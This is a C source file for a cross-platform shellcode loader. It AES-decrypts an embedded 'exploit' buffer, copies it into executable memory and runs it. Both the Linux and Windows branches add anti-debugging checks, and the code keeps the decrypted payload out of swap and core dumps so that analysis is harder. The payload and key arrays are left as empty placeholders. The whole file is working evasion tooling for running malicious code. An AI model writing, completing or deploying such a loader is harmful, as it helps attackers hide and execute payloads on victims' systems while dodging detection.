#define _DEFAULT_SOURCE
#include "crypto/crypto.h"


/*
 *
 *  LINUX
 * 
 */
#ifdef __unix__

#include <sys/ptrace.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <memory.h>
#include <unistd.h>
#include <stdio.h>

#define EXPLOIT_SIZE sizeof(buf)
#define KEY_LENGTH sizeof(key)


__uint8_t buf[] = {
    // exploit here
};

__uint8_t key[] = {
    // key here
};


void (* exploit)();

int main ( void ) {
    // anti-debug
    if (ptrace(PTRACE_TRACEME) == -1) {
        write(2, "DEBUGGER DETECTED!\n", 19);
        _exit(1);
    }

    // decrypt exploit
    AesCipher *cipher;
    size_t decrypted_exploit_size;
    cipher = AesInit(key, KEY_LENGTH);

    for (size_t cnt = 0; cnt < EXPLOIT_SIZE; cnt += 16) {
        AesDecryptor(cipher, buf + cnt);
        AesGetBlock(cipher, buf + cnt);
    }

    AesFree(cipher);
    unpad(buf, EXPLOIT_SIZE, buf, AES_BLOCK_SIZE, &decrypted_exploit_size);

    // allocate exploit memory
    if ((exploit = mmap(NULL, decrypted_exploit_size, PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0)) == MAP_FAILED) {
        write(2, "mmap error\n", 11);
        _exit(1);
    }

    // disable swap
    if (mlock(exploit, decrypted_exploit_size) == -1) {
        free(exploit);
        write(2, "mlock\n", 6);
        _exit(1);
    }
    
    // copy encrypted exploit
    memcpy(exploit, buf, decrypted_exploit_size);
    
    // protect the memory
    if (mprotect(exploit, decrypted_exploit_size, PROT_EXEC | PROT_READ) == -1) {
        free(exploit);
        write(2, "mrotect error\n", 14);
        _exit(1);
    }

    // disable core dump
    if (madvise(exploit, decrypted_exploit_size, MADV_DONTDUMP) == -1) {
        free(exploit);
        write(2, "madvise\n", 8);
        _exit(1);
    }

    exploit();

    return 0;
}

#elifdef _WIN32

#include <windows.h>
#include <memory.h>

#define EXPLOIT_SIZE sizeof(buf)
#define KEY_LENGTH sizeof(key)


uint8_t buf[] = {
    // exploit here
};

uint8_t key[] = {
    // key here
};


void (* exploit)();


int main ( void ) {
    // anti-debug
    BOOL remoteDebugger = FALSE;
    DWORD tmp;

    if (IsDebuggerPresent() ||
        (CheckRemoteDebuggerPresent(
            GetCurrentProcess(),
            &remoteDebugger
        ) && remoteDebugger)) {
        
        WriteConsole(
            GetStdHandle(STD_OUTPUT_HANDLE),
            "DEBUGGER DETECTED!\n",
            19,
            &tmp,
            NULL
        );
        exit(1);
    }

    // decrypt exploit
    AesCipher *cipher;
    size_t decrypted_exploit_size;
    cipher = AesInit(key, KEY_LENGTH);

    for (size_t cnt = 0; cnt < EXPLOIT_SIZE; cnt += 16) {
        AesDecryptor(cipher, buf + cnt);
        AesGetBlock(cipher, buf + cnt);
    }

    AesFree(cipher);
    unpad(buf, EXPLOIT_SIZE, buf, AES_BLOCK_SIZE, &decrypted_exploit_size);

    // allocate exploit memory
    if ((exploit = VirtualAlloc(NULL, decrypted_exploit_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) == NULL) {
        WriteConsole(
            GetStdHandle(STD_OUTPUT_HANDLE),
            "VirtualAlloc\n",
            13,
            &tmp,
            NULL
        );
        exit(1);
    }

    // disable swap
    if (!VirtualLock(exploit, decrypted_exploit_size)) {
        VirtualFree(exploit, decrypted_exploit_size, MEM_RELEASE);

        WriteConsole(
            GetStdHandle(STD_OUTPUT_HANDLE),
            "VirtualLock\n",
            12,
            &tmp,
            NULL
        );
        exit(1);
    }

    memcpy(exploit, buf, decrypted_exploit_size);

    // protect the memory
    DWORD old_protect;

    if (!VirtualProtect(exploit, decrypted_exploit_size, PAGE_EXECUTE, &old_protect)) {
        SecureZeroMemory(exploit, decrypted_exploit_size);
        VirtualFree(exploit, decrypted_exploit_size, MEM_RELEASE);

        WriteConsole(
            GetStdHandle(STD_OUTPUT_HANDLE),
            "VirtualProtect\n",
            15,
            &tmp,
            NULL
        );
        exit(1);
    }

    exploit();

    return 0;
}


#endif